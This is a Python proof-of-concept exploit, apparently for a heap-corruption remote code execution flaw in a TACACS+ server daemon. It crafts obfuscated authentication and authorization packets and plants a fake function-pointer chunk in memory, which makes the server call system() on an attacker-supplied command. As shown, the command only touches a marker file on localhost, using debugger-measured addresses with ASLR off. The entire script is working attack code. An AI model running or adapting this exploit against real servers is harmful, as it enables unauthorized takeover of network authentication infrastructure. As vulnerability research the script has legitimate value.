#!/usr/bin/env python3
"""W134 refinement: real mem_t, arr pointing at a valid attacker-filled chunk.

The W129 t-slot primitive writes 16 bytes at real-session->mem+8:
  type=0 (skip memlist destroy), arr_count=1, arr=cmd_argp[12].
cmd_argp[12] is a valid calloc chunk allocated after eval_args; its first bytes
come from prime plaintext and carry {system, command-address, "touch ..."}.
mem_destroy then calls arr[0].f(arr[0].p) and both frees are valid.
Addresses are measured under gdb (ASLR off); no off-loopback traffic.
"""
import argparse
import hashlib
import socket
import struct


def pad(sid, key, version, seq, prev=b""):
    return hashlib.md5(sid + key + bytes([version, seq]) + prev).digest()


def obf(body, sid, key, version, seq):
    p = pad(sid, key, version, seq)
    out = bytearray()
    for i in range(0, len(body), 16):
        c = body[i:i + 16]
        out.extend(a ^ b for a, b in zip(c, p))
        p = pad(sid, key, version, seq, p)
    return bytes(out)


def wire_hdr(ptype, seq, sid, body, key, version=0xC0, flags=0):
    e = obf(body, sid, key, version, seq)
    hdr = struct.pack("!BBBBI", version, ptype, seq, flags, int.from_bytes(sid, "big"))
    hdr += struct.pack("!I", len(body))
    return hdr + e


def authen_start(sid, key, user, version=0xC0):
    u = user.encode()
    return wire_hdr(1, 1, sid, bytes([1, 0, 1, 1, len(u), 0, 0, 0]) + u, key, version)


def authen_cont_prime(sid, key, seq, body_len, pattern_body_off, pattern, version=0xC0):
    data_len = body_len - 5
    fixed = struct.pack("!HHB", 0, data_len, 0)
    data = bytearray(b"P" * data_len)
    off = pattern_body_off - 5
    data[off:off + len(pattern)] = pattern
    return wire_hdr(1, seq, sid, fixed + bytes(data), key, version)


def author_trigger(sid, key, seq, table, data, version=0xC0):
    fixed = bytes([6, 1, 1, 1, 0, 0, 0, len(table)])
    return wire_hdr(2, seq, sid, fixed + bytes(table) + data, key, version)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=5099)
    ap.add_argument("--key", default="demo")
    ap.add_argument("--trigger-sid", default="aabbccdd")
    ap.add_argument("--user", default="demo")
    ap.add_argument("--in-addr", default="0x5555555fda20")
    ap.add_argument("--mem-addr", default="0x5555555fd5d0")
    ap.add_argument("--arr-chunk-addr", default="0x5555555fe440")
    ap.add_argument("--system-addr", default="0x7ffff7c58750")
    ap.add_argument("--marker", default="/tmp/tacplus-rce-marker")
    ap.add_argument("--pattern-off", type=int, default=1112)
    ap.add_argument("--prime-len", type=int, default=2000)
    ap.add_argument("--no-prime", action="store_true")
    ap.add_argument("--data",
                    default="cmd=AAAAcmd=BBBBcmd=CCCCcmd=DDDDcmd=EEEEcmd=FFFFcmd=GGGGcmd=HHHH")
    ap.add_argument("--timeout", type=float, default=3.0)
    ap.add_argument("--arg0", type=int, default=8)
    ap.add_argument("--rest", type=int, default=19)
    ap.add_argument("--rest-byte", type=int, default=8)
    a = ap.parse_args()

    sid = bytes.fromhex("11223344")
    key = a.key.encode()
    in_addr = int(a.in_addr, 16)
    mem = int(a.mem_addr, 16)
    arr_chunk = int(a.arr_chunk_addr, 16)
    system_addr = int(a.system_addr, 16)
    pattern_base = in_addr + 1156
    target = mem + 8
    command = ("touch " + a.marker).encode() + b"\x00"

    # i=12 (l=64): an argument with no cmd= prefix. eval_args ignores it, but
    # author() allocates cmd_argp[12] = 64 bytes copied from pattern+0.
    chunk = bytearray(64)
    chunk[0:8] = system_addr.to_bytes(8, "little")
    chunk[8:16] = (pattern_base + 16).to_bytes(8, "little")
    chunk[16:16 + len(command)] = command

    # i=13 transit: 136 bytes to cmdline+32..+167, t -> cmdline+168 (t slot).
    transit = bytearray(b"F" * 136)
    transit[104:112] = target.to_bytes(8, "little")
    transit[128:136] = (13).to_bytes(8, "little")

    pattern = bytearray(b"X" * 400)
    pattern[0:64] = chunk
    pattern[64:68] = b"cmd="
    pattern[68:204] = transit
    pattern[204:208] = b"cmd="
    pattern[208:216] = (target - 8).to_bytes(8, "little")
    pattern[216:220] = b"cmd="
    pattern[220:236] = (0).to_bytes(4, "little") + (1).to_bytes(4, "little") + arr_chunk.to_bytes(8, "little")

    table = [8] * 20
    for si, val in ((8, 255), (9, 255), (10, 255), (11, 255),
                    (12, 64), (13, 140), (14, 12), (15, 20)):
        table[si] = val
    for si in range(16, 20):
        table[si] = 0

    s = socket.create_connection(("127.0.0.1", a.port), timeout=a.timeout)
    s.settimeout(a.timeout)
    if not a.no_prime:
        p1 = authen_start(sid, key, a.user)
        s.sendall(p1)
        try:
            r1 = s.recv(65536)
        except socket.timeout:
            r1 = b""
        print(f"seq1 sent={len(p1)} reply_len={len(r1)}")
        p2 = authen_cont_prime(sid, key, 3, a.prime_len, a.pattern_off, bytes(pattern))
        s.sendall(p2)
        try:
            r2 = s.recv(65536)
        except socket.timeout:
            r2 = b""
        print(f"seq3 sent={len(p2)} reply_len={len(r2)}")
    p3 = author_trigger(bytes.fromhex(a.trigger_sid), key, 1, table, a.data.encode())
    s.sendall(p3)
    try:
        r3 = s.recv(65536)
    except socket.timeout:
        r3 = b""
    print(f"trigger sent={len(p3)} reply_len={len(r3)} reply={r3[:64].hex()}")
    print(f"in=0x{in_addr:x} mem=0x{mem:x} target=0x{target:x} arr_chunk=0x{arr_chunk:x} "
          f"cmd=0x{pattern_base + 16:x} system=0x{system_addr:x}")
    s.close()


if __name__ == "__main__":
    main()
